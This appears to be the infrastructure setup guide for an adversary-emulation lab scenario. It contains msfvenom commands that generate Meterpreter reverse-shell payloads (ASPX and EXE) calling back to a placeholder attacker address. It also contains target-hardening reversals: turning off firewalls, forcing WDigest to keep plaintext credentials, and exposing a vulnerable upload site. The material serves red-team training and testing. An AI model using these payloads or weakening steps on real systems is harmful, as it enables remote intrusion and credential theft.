# Scenario 1 Infrastructure

## I. Emulation Team Infrastructure

### 1. Attack Platform: 

#### [+] Tested and executed on Kali Linux 2023.2

#### [+] Metasploit 6.3.21-dev

#### [+] Stage certain files for download
- Craft session.aspx
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=<ip_attacker> LPORT=4444 -f aspx > ~/modules/session.aspx
```

- Craft session.exe
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=<ip_attacker> LPORT=4445 -f exe > ~/modules/session.exe
```
- Copy these files from `Resources` to `~/modules/`
```
PsExec.exe
sysinfo.ps1
7z.exe
```

- `~/modules/` should now contains these
```
PsExec.exe
sysinfo.ps1
7z.exe
session.aspx
session.exe
```

## II. Target Infrastructure

### 1. AD server
#### [+] Tested and executed on Window Server 2012 R2
#### [+] Turn off firewall
#### [+] Enable File and Printer Sharing
- Open Powershell as Administrator
```
Set-NetFirewallRule -DisplayGroup “File And Printer Sharing” -Enabled True -Profile Private
```

### 2. IIS server
#### [+] Tested and executed on Window Server 2012 R2
#### [+] Turn off firewall
#### [+] Forcing WDigest to Store Credentials in Plaintext
- Open Powershell as Administrator
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
#### [+] Join AD domain
#### [+] Domain user with local admin access on this machine
#### [+] A website with upload file vulnerability
